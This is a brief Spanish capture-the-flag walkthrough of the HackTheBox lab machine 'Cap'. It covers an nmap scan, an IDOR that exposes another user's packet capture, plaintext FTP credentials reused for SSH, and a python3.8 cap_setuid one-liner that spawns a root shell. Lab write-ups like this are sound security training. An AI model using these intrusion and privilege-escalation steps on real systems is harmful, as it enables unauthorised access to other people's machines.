# Cap - HackTheBox
**IP:** 10.10.10.245

## Enumeración
```bash
nmap -sC -sV -p- --open --min-rate 5000 -Pn 10.10.10.245
```
App web de "Security Snapshot" junto con FTP, SSH y HTTP.

## Foothold - IDOR + captura FTP
La sección *Security Snapshot* genera capturas en `/data/<id>`. Cambiando el ID a `/data/0` accedemos a la captura de otro usuario (IDOR) y descargamos un `.pcap`.
Abriéndolo en Wireshark aparecen credenciales FTP en texto plano:
```
USER nathan
PASS Buck3tH4TF0RM3!
```
Reutilizamos por SSH:
```bash
ssh nathan@10.10.10.245
```

## Escalada - Linux capability cap_setuid
```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
`python3.8` tiene la capability `cap_setuid`, así que seteamos UID 0 y lanzamos shell root:
```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```
Root.
